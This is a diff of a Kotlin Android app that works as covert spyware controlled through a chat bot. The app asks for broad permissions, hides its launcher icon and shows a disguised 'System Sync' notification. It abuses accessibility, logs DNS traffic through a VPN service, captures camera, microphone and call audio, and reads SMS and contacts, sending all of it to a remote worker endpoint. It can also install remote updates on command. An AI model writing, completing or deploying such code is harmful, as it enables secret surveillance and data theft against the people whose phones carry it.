@@ -5,6 +5,7 @@ import android.accessibilityservice.AccessibilityService
 import android.app.*
 import android.content.*
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.database.ContentObserver
 import android.graphics.*
 import android.hardware.display.DisplayManager
@@ -17,14 +18,15 @@ import android.net.wifi.WifiManager
 import android.os.*
 import android.provider.*
 import android.provider.MediaStore
-import kotlin.concurrent.thread
 import android.telephony.*
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
+import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
 import androidx.core.content.FileProvider
+import com.example.systemsync.databinding.ActivityMainBinding
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -45,86 +47,115 @@ import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
 // ============================================================
-// ۱) MainActivity
+// 1) MainActivity
 // ============================================================
 class MainActivity : AppCompatActivity() {
+    private lateinit var binding: ActivityMainBinding
+    private var pendingBgLoc = false
+
     private val perms = mutableListOf(
-        Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.READ_PHONE_STATE, Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.CAMERA, Manifest.permission.POST_NOTIFICATIONS
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.CAMERA,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION
     ).apply {
         if (Build.VERSION.SDK_INT >= 33) {
-            add(Manifest.permission.READ_MEDIA_IMAGES); add(Manifest.permission.READ_MEDIA_VIDEO)
+            add(Manifest.permission.POST_NOTIFICATIONS)
+            add(Manifest.permission.READ_MEDIA_IMAGES)
+            add(Manifest.permission.READ_MEDIA_VIDEO)
         } else add(Manifest.permission.READ_EXTERNAL_STORAGE)
     }
 
+    private var idx = 0
+    private val REQ_PERM = 100
+    private val REQ_BG_LOC = 101
+
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
-        setContentView(R.layout.activity_main)
-        val nameInput = findViewById<android.widget.EditText>(R.id.etName)
-        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
-        nameInput.setText(prefs.getString("name", BuildConfig.DEFAULT_NAME))
-        findViewById<android.widget.TextView>(R.id.tvVersion).text =
-            "نسخه: ${BuildConfig.APP_VERSION_NAME} (${BuildConfig.APP_VERSION_CODE})"
+        binding = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(binding.root)
+        binding.tvVersion.text = "نسخه: ${BuildConfig.APP_VERSION_NAME}"
+        binding.btnStart.setOnClickListener { idx = 0; next() }
+        binding.btnCheckUpdate.setOnClickListener { Updater(this).checkAndPrompt() }
+    }
 
-        findViewById<android.widget.Button>(R.id.btnCheckUpdate).setOnClickListener {
-            Updater(this).checkAndPrompt()
+    private fun next() {
+        if (idx >= perms.size) { allDone(); return }
+        val p = perms[idx]
+        if (ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED) {
+            idx++; next()
+        } else {
+            androidx.core.app.ActivityCompat.requestPermissions(this, arrayOf(p), REQ_PERM)
         }
+    }
 
-        findViewById<android.widget.Button>(R.id.btnStart).setOnClickListener {
-            val name = nameInput.text.toString().trim().ifEmpty { "phone" }
-            prefs.edit().putString("name", name).apply()
-            val missing = perms.filter {
-                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+    override fun onRequestPermissionsResult(rc: Int, ps: Array<out String>, rs: IntArray) {
+        super.onRequestPermissionsResult(rc, ps, rs)
+        when (rc) {
+            REQ_PERM -> { idx++; next() }
+            REQ_BG_LOC -> startMonitoring()
+        }
+    }
+
+    private fun allDone() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                pendingBgLoc = true
+                try {
+                    startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                        .setData(Uri.parse("package:$packageName")))
+                } catch (_: Exception) { startMonitoring() }
+                return
+            } else {
+                androidx.core.app.ActivityCompat.requestPermissions(this,
+                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), REQ_BG_LOC)
+                return
             }
-            if (missing.isEmpty()) begin() else
-                ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1)
         }
+        startMonitoring()
     }
 
-    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
-        super.onRequestPermissionsResult(r, p, g)
-        if (r == 1 && perms.all {
-                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
-            }) begin()
-        else findViewById<android.widget.TextView>(R.id.tvStatus).text = "دسترسی ناقص"
+    override fun onResume() {
+        super.onResume()
+        if (pendingBgLoc) { pendingBgLoc = false; startMonitoring() }
     }
 
-    private fun begin() {
-        val pm = getSystemService(POWER_SERVICE) as PowerManager
-        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-            try {
-                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                    .setData(Uri.parse("package:$packageName")))
-            } catch (_: Exception) {}
-        }
+    private fun startMonitoring() {
         try {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-        } catch (_: Exception) {}
-
-        // یک بار درخواست تایید VPN
-        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
-        if (!prefs.getBoolean("vpnAsked", false)) {
-            prefs.edit().putBoolean("vpnAsked", true).apply()
-            try {
-                startActivity(Intent(this, TrafficApprovalActivity::class.java)
-                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-            } catch (_: Exception) {}
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                try {
+                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                        .setData(Uri.parse("package:$packageName")))
+                } catch (_: Exception) {}
+            }
+            ContextCompat.startForegroundService(this, Intent(this, BotService::class.java))
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            binding.tvStatus.text = "فعال شد — آیکون مخفی"
+            binding.btnStart.isEnabled = false
+            binding.root.postDelayed({
+                try { finishAndRemoveTask() } catch (_: Exception) { finish() }
+            }, 2000)
+        } catch (e: Exception) {
+            Log.e("MainActivity", "startMonitoring failed", e)
+            binding.tvStatus.text = "خطا: ${e.message}"
         }
-
-        ContextCompat.startForegroundService(this, Intent(this, BotService::class.java))
-        packageManager.setComponentEnabledSetting(
-            ComponentName(this, MainActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP)
-        findViewById<android.widget.TextView>(R.id.tvStatus).text = "فعال شد — آیکون مخفی"
     }
 }
 
 // ============================================================
-// ۲) BootReceiver
+// 2) BootReceiver
 // ============================================================
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(c: Context, i: Intent) {
@@ -134,7 +165,7 @@ class BootReceiver : BroadcastReceiver() {
 }
 
 // ============================================================
-// ۳) SmsReceiver
+// 3) SmsReceiver
 // ============================================================
 class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(c: Context, i: Intent) {
@@ -169,6 +200,9 @@ class SmsReceiver : BroadcastReceiver() {
     }
 }
 
+// ============================================================
+// 4) BackgroundPush
+// ============================================================
 object BackgroundPush {
     private val http = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
     fun push(ctx: Context, text: String) {
@@ -178,7 +212,8 @@ object BackgroundPush {
         val name = prefs.getString("name", "phone")
         try {
             val body = JSONObject().apply {
-                put("chat_id", chatId); put("text", "[$name]\n$text".take(4000))
+                put("chat_id", chatId)
+                put("text", "[$name]\n$text".take(4000))
             }
             http.newCall(Request.Builder()
                 .url("${BuildConfig.WORKER_URL.trimEnd('/')}/api/sendMessage")
@@ -189,7 +224,7 @@ object BackgroundPush {
 }
 
 // ============================================================
-// ۴) Config
+// 5) Config
 // ============================================================
 class Config(ctx: Context) {
     private val p = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE)
@@ -211,7 +246,7 @@ class Config(ctx: Context) {
 }
 
 // ============================================================
-// ۵) Worker Client
+// 6) Worker Client
 // ============================================================
 class Worker(private val cfg: Config) {
     private val base   = BuildConfig.WORKER_URL.trimEnd('/')
@@ -313,12 +348,13 @@ class Worker(private val cfg: Config) {
         if (cfg.quality != "original") {
             val reduced = withContext(Dispatchers.IO) { onReduce(file) }
             if (reduced != null && reduced.exists() && reduced.length() <= limit) {
-                sendText(chatId, "🔄 کیفیت کاهش یافت")
+                sendText(chatId, "🔄 کیفیت کاهش یافت: ${file.length()/1024/1024}MB → ${reduced.length()/1024/1024}MB")
                 sendFile(chatId, reduced); return
             }
         }
         if (!cfg.chunkOn) {
-            sendText(chatId, "⚠️ فایل بزرگ‌تر از ۴۵MB. `/chunk on` رو فعال کن."); return
+            sendText(chatId, "⚠️ فایل ${file.length()/1024/1024}MB از ۴۵MB بیشتره.\n`/chunk on` رو فعال کن.")
+            return
         }
         sendText(chatId, "📦 ${file.length()/1024/1024}MB در حال تکه‌تکه شدن...")
         val uploadId = UUID.randomUUID().toString().replace("-","").take(12)
@@ -348,7 +384,7 @@ class Worker(private val cfg: Config) {
 }
 
 // ============================================================
-// ۶) Updater
+// 7) Updater
 // ============================================================
 class Updater(private val context: Context) {
     private val http = OkHttpClient()
@@ -424,7 +460,7 @@ class Updater(private val context: Context) {
 }
 
 // ============================================================
-// ۷) InstallActivity
+// 8) InstallActivity
 // ============================================================
 class InstallActivity : AppCompatActivity() {
     override fun onCreate(s: Bundle?) {
@@ -442,17 +478,14 @@ class InstallActivity : AppCompatActivity() {
 }
 
 // ============================================================
-// ۸) TrafficApprovalActivity — تایید یک‌بار VPN
+// 9) TrafficApprovalActivity
 // ============================================================
 class TrafficApprovalActivity : AppCompatActivity() {
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
         val prepare = VpnService.prepare(this)
-        if (prepare != null) {
-            startActivityForResult(prepare, 100)
-        } else {
-            finish()
-        }
+        if (prepare != null) startActivityForResult(prepare, 100)
+        else finish()
     }
     override fun onActivityResult(rc: Int, result: Int, data: Intent?) {
         super.onActivityResult(rc, result, data)
@@ -465,195 +498,7 @@ class TrafficApprovalActivity : AppCompatActivity() {
 }
 
 // ============================================================
-// ۹) TrafficService — VpnService برای رصد DNS
-// ============================================================
-class TrafficService : VpnService() {
-    companion object {
-        @Volatile var instance: TrafficService? = null
-    }
-
-    private var tunFd: ParcelFileDescriptor? = null
-    @Volatile private var running = false
-    private var tunIn: FileInputStream? = null
-    private var tunOut: FileOutputStream? = null
-    private lateinit var dnsSocket: DatagramSocket
-    private val domainCounts = ConcurrentHashMap<String, Int>()
-    private val lastSeen = ConcurrentHashMap<String, Long>()
-
-    override fun onCreate() {
-        super.onCreate()
-        instance = this
-        startForeground(2, notif())
-        try {
-            dnsSocket = DatagramSocket()
-            protect(dnsSocket)
-        } catch (_: Exception) { return }
-        startVpn()
-    }
-
-    private fun startVpn() {
-        val builder = Builder()
-            .setSession("System")
-            .addAddress("10.8.0.2", 32)
-            .addDnsServer("10.8.0.1")
-            .addRoute("10.8.0.1", 32)
-            .setBlocking(true)
-        try { builder.addDisallowedApplication(packageName) } catch (_: Exception) {}
-
-        tunFd = try { builder.establish() } catch (_: Exception) { null } ?: return
-        tunIn = FileInputStream(tunFd!!.fileDescriptor)
-        tunOut = FileOutputStream(tunFd!!.fileDescriptor)
-        running = true
-        thread { readLoop() }
-    }
-
-    private fun readLoop() {
-        val buf = ByteArray(32767)
-        while (running) {
-            try {
-                val len = tunIn?.read(buf) ?: break
-                if (len > 0) handlePacket(buf, len)
-            } catch (_: Exception) { break }
-        }
-    }
-
-    private fun handlePacket(buf: ByteArray, len: Int) {
-        if (len < 28) return
-        val ver = (buf[0].toInt() ushr 4) and 0xF
-        if (ver != 4) return
-        val ihl = (buf[0].toInt() and 0xF) * 4
-        if (len < ihl + 8) return
-        val proto = buf[9].toInt() and 0xFF
-        if (proto != 17) return
-        val dstPort = ((buf[ihl+2].toInt() and 0xFF) shl 8) or (buf[ihl+3].toInt() and 0xFF)
-        if (dstPort != 53) return
-
-        val query = buf.copyOfRange(ihl + 8, len)
-        val domain = parseDnsName(query)
-        if (!domain.isNullOrEmpty() && !domain.endsWith(".local") && domain.contains(".")) {
-            domainCounts.merge(domain, 1, Int::plus)
-            lastSeen[domain] = System.currentTimeMillis()
-        }
-        val response = forwardDns(query) ?: return
-        sendResponse(buf, ihl, response)
-    }
-
-    private fun parseDnsName(data: ByteArray): String? {
-        if (data.size < 12) return null
-        var pos = 12
-        val parts = mutableListOf<String>()
-        var safety = 0
-        while (pos < data.size && safety++ < 50) {
-            val lenByte = data[pos].toInt() and 0xFF
-            if (lenByte == 0) break
-            if ((lenByte and 0xC0) == 0xC0) break
-            if (lenByte > 63) break
-            if (pos + lenByte >= data.size) break
-            parts.add(String(data, pos + 1, lenByte))
-            pos += lenByte + 1
-        }
-        return if (parts.isEmpty()) null else parts.joinToString(".")
-    }
-
-    private fun forwardDns(query: ByteArray): ByteArray? {
-        return try {
-            val addr = InetAddress.getByName("8.8.8.8")
-            val send = DatagramPacket(query, query.size, addr, 53)
-            dnsSocket.soTimeout = 3000
-            dnsSocket.send(send)
-            val response = ByteArray(4096)
-            val recv = DatagramPacket(response, response.size)
-            dnsSocket.receive(recv)
-            response.copyOf(recv.length)
-        } catch (_: Exception) { null }
-    }
-
-    private fun sendResponse(original: ByteArray, ihl: Int, dnsResponse: ByteArray) {
-        try {
-            val totalLen = ihl + 8 + dnsResponse.size
-            val out = ByteArray(totalLen)
-            System.arraycopy(original, 0, out, 0, ihl)
-            // Swap src/dst IP
-            System.arraycopy(original, 16, out, 12, 4)
-            System.arraycopy(original, 12, out, 16, 4)
-            out[2] = (totalLen ushr 8).toByte()
-            out[3] = (totalLen and 0xFF).toByte()
-            out[10] = 0; out[11] = 0
-            val csum = ipChecksum(out, 0, ihl)
-            out[10] = (csum ushr 8).toByte()
-            out[11] = (csum and 0xFF).toByte()
-
-            // UDP header (swap ports)
-            val srcPort = ((original[ihl].toInt() and 0xFF) shl 8) or (original[ihl+1].toInt() and 0xFF)
-            val dstPort = ((original[ihl+2].toInt() and 0xFF) shl 8) or (original[ihl+3].toInt() and 0xFF)
-            out[ihl] = (dstPort ushr 8).toByte()
-            out[ihl+1] = (dstPort and 0xFF).toByte()
-            out[ihl+2] = (srcPort ushr 8).toByte()
-            out[ihl+3] = (srcPort and 0xFF).toByte()
-            val udpLen = 8 + dnsResponse.size
-            out[ihl+4] = (udpLen ushr 8).toByte()
-            out[ihl+5] = (udpLen and 0xFF).toByte()
-            out[ihl+6] = 0; out[ihl+7] = 0
-
-            System.arraycopy(dnsResponse, 0, out, ihl + 8, dnsResponse.size)
-            tunOut?.write(out)
-        } catch (_: Exception) {}
-    }
-
-    private fun ipChecksum(data: ByteArray, offset: Int, length: Int): Int {
-        var sum = 0
-        var i = offset
-        while (i < offset + length) {
-            sum += ((data[i].toInt() and 0xFF) shl 8) or (data[i+1].toInt() and 0xFF)
-            i += 2
-        }
-        while (sum > 0xFFFF) sum = (sum and 0xFFFF) + (sum ushr 16)
-        return sum.inv() and 0xFFFF
-    }
-
-    fun dumpStats(): String {
-        if (domainCounts.isEmpty()) return "ترافیکی ثبت نشده."
-        val sb = StringBuilder("=== گزارش ترافیک DNS ===\n\n")
-        sb.appendLine("Domain\tCount\tLast")
-        sb.appendLine("──────\t─────\t────")
-        domainCounts.entries.sortedByDescending { it.value }.forEach { (domain, count) ->
-            val ts = lastSeen[domain] ?: 0
-            val time = SimpleDateFormat("HH:mm", Locale.US).format(Date(ts))
-            sb.appendLine("$domain\t$count\t$time")
-        }
-        return sb.toString()
-    }
-
-    fun clearStats() {
-        domainCounts.clear(); lastSeen.clear()
-    }
-
-    private fun notif(): Notification {
-        val ch = "v"
-        if (Build.VERSION.SDK_INT >= 26) {
-            val nm = getSystemService(NotificationManager::class.java)
-            if (nm.getNotificationChannel(ch) == null)
-                nm.createNotificationChannel(NotificationChannel(ch, "Network", NotificationManager.IMPORTANCE_LOW))
-        }
-        return NotificationCompat.Builder(this, ch)
-            .setSmallIcon(android.R.drawable.stat_sys_download_done)
-            .setContentTitle("System").setContentText("Network active")
-            .setOngoing(true).build()
-    }
-
-    override fun onDestroy() {
-        running = false
-        instance = null
-        try { tunIn?.close() } catch (_: Exception) {}
-        try { tunOut?.close() } catch (_: Exception) {}
-        try { tunFd?.close() } catch (_: Exception) {}
-        try { dnsSocket.close() } catch (_: Exception) {}
-        super.onDestroy()
-    }
-}
-
-// ============================================================
-// ۱۰) ScreenCaptureActivity
+// 10) ScreenCaptureActivity
 // ============================================================
 class ScreenCaptureActivity : AppCompatActivity() {
     override fun onCreate(s: Bundle?) {
@@ -677,7 +522,7 @@ class ScreenCaptureActivity : AppCompatActivity() {
 }
 
 // ============================================================
-// ۱۱) CaptureService — Accessibility
+// 11) CaptureService (Accessibility)
 // ============================================================
 class CaptureService : AccessibilityService() {
     private lateinit var cfg: Config
@@ -721,7 +566,7 @@ class CaptureService : AccessibilityService() {
 }
 
 // ============================================================
-// ۱۲) Collector
+// 12) Collector
 // ============================================================
 class Collector(private val ctx: Context) {
     fun info(): String {
@@ -851,7 +696,7 @@ class Collector(private val ctx: Context) {
 }
 
 // ============================================================
-// ۱۳) Cam
+// 13) Cam
 // ============================================================
 class Cam {
     fun takePhoto(ctx: Context): File {
@@ -880,7 +725,8 @@ class Cam {
         try {
             c.unlock()
             val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
-            mr.setCamera(c); mr.setAudioSource(MediaRecorder.AudioSource.MIC)
+            mr.setCamera(c)
+            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
             mr.setVideoSource(MediaRecorder.VideoSource.CAMERA)
             mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
             mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
@@ -905,7 +751,7 @@ class Cam {
 }
 
 // ============================================================
-// ۱۴) Rec
+// 14) Rec
 // ============================================================
 class Rec(private val ctx: Context) {
     fun recordVoice(seconds: Int, quality: String): File {
@@ -925,10 +771,22 @@ class Rec(private val ctx: Context) {
         mr.release()
         return f
     }
+    fun recordCall(seconds: Int, quality: String): File {
+        val f = File(ctx.cacheDir, "call_${System.currentTimeMillis()}.m4a")
+        val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
+        mr.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
+        mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+        mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+        mr.setOutputFile(f.absolutePath); mr.prepare(); mr.start()
+        Thread.sleep(seconds * 1000L)
+        try { mr.stop() } catch (_: Exception) {}
+        mr.release()
+        return f
+    }
 }
 
 // ============================================================
-// ۱۵) QualityReducer
+// 15) QualityReducer
 // ============================================================
 object QualityReducer {
     fun reducePhoto(file: File, outDir: File, quality: String): File? {
@@ -943,7 +801,7 @@ object QualityReducer {
 }
 
 // ============================================================
-// ۱۶) CallMonitor
+// 16) CallMonitor
 // ============================================================
 class CallMonitor(private val ctx: Context, private val cfg: Config, private val onEvent: (String) -> Unit) {
     private var phoneListener: PhoneStateListener? = null
@@ -1021,7 +879,7 @@ class CallMonitor(private val ctx: Context, private val cfg: Config, private val
 }
 
 // ============================================================
-// ۱۷) MediaWatcher
+// 17) MediaWatcher
 // ============================================================
 class MediaWatcher(private val ctx: Context, private val onEvent: (String) -> Unit) {
     private var imgObs: ContentObserver? = null
@@ -1077,7 +935,184 @@ class MediaWatcher(private val ctx: Context, private val onEvent: (String) -> Un
 }
 
 // ============================================================
-// ۱۸) BotService
+// 18) TrafficService (VpnService - DNS only)
+// ============================================================
+class TrafficService : VpnService() {
+    companion object {
+        @Volatile var instance: TrafficService? = null
+    }
+    private var tunFd: ParcelFileDescriptor? = null
+    @Volatile private var running = false
+    private var tunIn: FileInputStream? = null
+    private var tunOut: FileOutputStream? = null
+    private var dnsSocket: DatagramSocket? = null
+    private val domainCounts = ConcurrentHashMap<String, Int>()
+    private val lastSeen = ConcurrentHashMap<String, Long>()
+
+    override fun onCreate() {
+        super.onCreate()
+        instance = this
+        startForeground(3, notifVpn())
+        try {
+            dnsSocket = DatagramSocket()
+            protect(dnsSocket)
+        } catch (_: Exception) { return }
+        startVpn()
+    }
+
+    private fun startVpn() {
+        val builder = Builder()
+            .setSession("System")
+            .addAddress("10.8.0.2", 32)
+            .addDnsServer("10.8.0.1")
+            .addRoute("10.8.0.1", 32)
+            .setBlocking(true)
+        try { builder.addDisallowedApplication(packageName) } catch (_: Exception) {}
+        tunFd = try { builder.establish() } catch (_: Exception) { null } ?: return
+        tunIn = FileInputStream(tunFd!!.fileDescriptor)
+        tunOut = FileOutputStream(tunFd!!.fileDescriptor)
+        running = true
+        thread { readLoop() }
+    }
+
+    private fun readLoop() {
+        val buf = ByteArray(32767)
+        while (running) {
+            try {
+                val len = tunIn?.read(buf) ?: break
+                if (len > 0) handlePacket(buf, len)
+            } catch (_: Exception) { break }
+        }
+    }
+
+    private fun handlePacket(buf: ByteArray, len: Int) {
+        if (len < 28) return
+        val ver = (buf[0].toInt() ushr 4) and 0xF
+        if (ver != 4) return
+        val ihl = (buf[0].toInt() and 0xF) * 4
+        if (len < ihl + 8) return
+        val proto = buf[9].toInt() and 0xFF
+        if (proto != 17) return
+        val dstPort = ((buf[ihl+2].toInt() and 0xFF) shl 8) or (buf[ihl+3].toInt() and 0xFF)
+        if (dstPort != 53) return
+        val query = buf.copyOfRange(ihl + 8, len)
+        val domain = parseDnsName(query)
+        if (!domain.isNullOrEmpty() && !domain.endsWith(".local") && domain.contains(".")) {
+            domainCounts.merge(domain, 1, Int::plus)
+            lastSeen[domain] = System.currentTimeMillis()
+        }
+        val response = forwardDns(query) ?: return
+        sendResponse(buf, ihl, response)
+    }
+
+    private fun parseDnsName(data: ByteArray): String? {
+        if (data.size < 12) return null
+        var pos = 12
+        val parts = mutableListOf<String>()
+        var safety = 0
+        while (pos < data.size && safety++ < 50) {
+            val lenByte = data[pos].toInt() and 0xFF
+            if (lenByte == 0) break
+            if ((lenByte and 0xC0) == 0xC0) break
+            if (lenByte > 63) break
+            if (pos + lenByte >= data.size) break
+            parts.add(String(data, pos + 1, lenByte))
+            pos += lenByte + 1
+        }
+        return if (parts.isEmpty()) null else parts.joinToString(".")
+    }
+
+    private fun forwardDns(query: ByteArray): ByteArray? {
+        return try {
+            val addr = InetAddress.getByName("8.8.8.8")
+            val send = DatagramPacket(query, query.size, addr, 53)
+            dnsSocket?.soTimeout = 3000
+            dnsSocket?.send(send)
+            val response = ByteArray(4096)
+            val recv = DatagramPacket(response, response.size)
+            dnsSocket?.receive(recv)
+            response.copyOf(recv.length)
+        } catch (_: Exception) { null }
+    }
+
+    private fun sendResponse(original: ByteArray, ihl: Int, dnsResponse: ByteArray) {
+        try {
+            val totalLen = ihl + 8 + dnsResponse.size
+            val out = ByteArray(totalLen)
+            System.arraycopy(original, 0, out, 0, ihl)
+            System.arraycopy(original, 16, out, 12, 4)
+            System.arraycopy(original, 12, out, 16, 4)
+            out[2] = (totalLen ushr 8).toByte()
+            out[3] = (totalLen and 0xFF).toByte()
+            out[10] = 0; out[11] = 0
+            val csum = ipChecksum(out, 0, ihl)
+            out[10] = (csum ushr 8).toByte()
+            out[11] = (csum and 0xFF).toByte()
+            val srcPort = ((original[ihl].toInt() and 0xFF) shl 8) or (original[ihl+1].toInt() and 0xFF)
+            val dstPort = ((original[ihl+2].toInt() and 0xFF) shl 8) or (original[ihl+3].toInt() and 0xFF)
+            out[ihl] = (dstPort ushr 8).toByte()
+            out[ihl+1] = (dstPort and 0xFF).toByte()
+            out[ihl+2] = (srcPort ushr 8).toByte()
+            out[ihl+3] = (srcPort and 0xFF).toByte()
+            val udpLen = 8 + dnsResponse.size
+            out[ihl+4] = (udpLen ushr 8).toByte()
+            out[ihl+5] = (udpLen and 0xFF).toByte()
+            out[ihl+6] = 0; out[ihl+7] = 0
+            System.arraycopy(dnsResponse, 0, out, ihl + 8, dnsResponse.size)
+            tunOut?.write(out)
+        } catch (_: Exception) {}
+    }
+
+    private fun ipChecksum(data: ByteArray, offset: Int, length: Int): Int {
+        var sum = 0
+        var i = offset
+        while (i < offset + length) {
+            sum += ((data[i].toInt() and 0xFF) shl 8) or (data[i+1].toInt() and 0xFF)
+            i += 2
+        }
+        while (sum > 0xFFFF) sum = (sum and 0xFFFF) + (sum ushr 16)
+        return sum.inv() and 0xFFFF
+    }
+
+    fun dumpStats(): String {
+        if (domainCounts.isEmpty()) return "ترافیکی ثبت نشده."
+        val sb = StringBuilder("=== گزارش ترافیک DNS ===\n\n")
+        sb.appendLine("Domain\tCount\tLast")
+        sb.appendLine("──────\t─────\t────")
+        domainCounts.entries.sortedByDescending { it.value }.forEach { (domain, count) ->
+            val ts = lastSeen[domain] ?: 0
+            val time = SimpleDateFormat("HH:mm", Locale.US).format(Date(ts))
+            sb.appendLine("$domain\t$count\t$time")
+        }
+        return sb.toString()
+    }
+
+    fun clearStats() { domainCounts.clear(); lastSeen.clear() }
+
+    private fun notifVpn(): Notification {
+        val ch = "v"
+        val nm = getSystemService(NotificationManager::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && nm.getNotificationChannel(ch) == null) {
+            nm.createNotificationChannel(NotificationChannel(ch, "Network", NotificationManager.IMPORTANCE_LOW))
+        }
+        return NotificationCompat.Builder(this, ch)
+            .setSmallIcon(android.R.drawable.stat_sys_download_done)
+            .setContentTitle("System").setContentText("Network active")
+            .setOngoing(true).build()
+    }
+
+    override fun onDestroy() {
+        running = false; instance = null
+        try { tunIn?.close() } catch (_: Exception) {}
+        try { tunOut?.close() } catch (_: Exception) {}
+        try { tunFd?.close() } catch (_: Exception) {}
+        try { dnsSocket?.close() } catch (_: Exception) {}
+        super.onDestroy()
+    }
+}
+
+// ============================================================
+// 19) BotService
 // ============================================================
 class BotService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -1086,14 +1121,18 @@ class BotService : Service() {
     private lateinit var col: Collector
     private lateinit var rec: Rec
     private lateinit var cam: Cam
+    private var db: AppDatabase? = null
     private var chatId = 0L
     private var callMonitor: CallMonitor? = null
     private var mediaWatcher: MediaWatcher? = null
 
     override fun onCreate() {
         super.onCreate()
-        startForeground(1, notif())
+        try { startForegroundCompat() } catch (e: Exception) {
+            Log.e("BotService", "startForeground failed", e); stopSelf(); return
+        }
         cfg = Config(this); col = Collector(this); rec = Rec(this); cam = Cam()
+        try { db = AppDatabase.get(this) } catch (e: Exception) { Log.e("BotService", "Room failed", e) }
         worker = Worker(cfg)
         if (cfg.trafficOn && VpnService.prepare(this) == null) {
             try { startService(Intent(this, TrafficService::class.java)) } catch (_: Exception) {}
@@ -1112,16 +1151,21 @@ class BotService : Service() {
         return START_STICKY
     }
 
-    private fun notif(): Notification {
+    private fun startForegroundCompat() {
         val ch = "s"
-        if (Build.VERSION.SDK_INT >= 26) {
-            val nm = getSystemService(NotificationManager::class.java)
-            if (nm.getNotificationChannel(ch) == null)
-                nm.createNotificationChannel(NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW))
+        val nm = getSystemService(NotificationManager::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && nm.getNotificationChannel(ch) == null) {
+            nm.createNotificationChannel(NotificationChannel(ch, "Sync", NotificationManager.IMPORTANCE_LOW))
         }
-        return NotificationCompat.Builder(this, ch)
+        val notif = NotificationCompat.Builder(this, ch)
             .setSmallIcon(android.R.drawable.stat_notify_sync)
-            .setContentTitle("IRAN-VPN").setContentText("سرویس در حال اجرا").setOngoing(true).build()
+            .setContentTitle("System Sync").setContentText("در حال اجرا")
+            .setOngoing(true).build()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            ServiceCompat.startForeground(this, 1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else {
+            startForeground(1, notif)
+        }
     }
 
     private suspend fun loop() {
@@ -1139,23 +1183,20 @@ class BotService : Service() {
         }
         callMonitor = CallMonitor(this, cfg) { text -> reply(text) }.also { it.start() }
         mediaWatcher = MediaWatcher(this) { text -> if (cfg.eventsOn) reply(text) }.also { it.start() }
-
-        while (scope.isActive) {
+        while (isActive) {
             try {
                 for (cmd in worker.poll(this)) {
                     if (cmd == "/install_update") {
                         reply("⬇️ در حال دانلود آپدیت...")
                         Updater(this@BotService).downloadAndInstallFromService()
-                    } else { handle(cmd) }
+                    } else handle(cmd)
                 }
             } catch (_: Exception) {}
             delay(5_000)
         }
     }
 
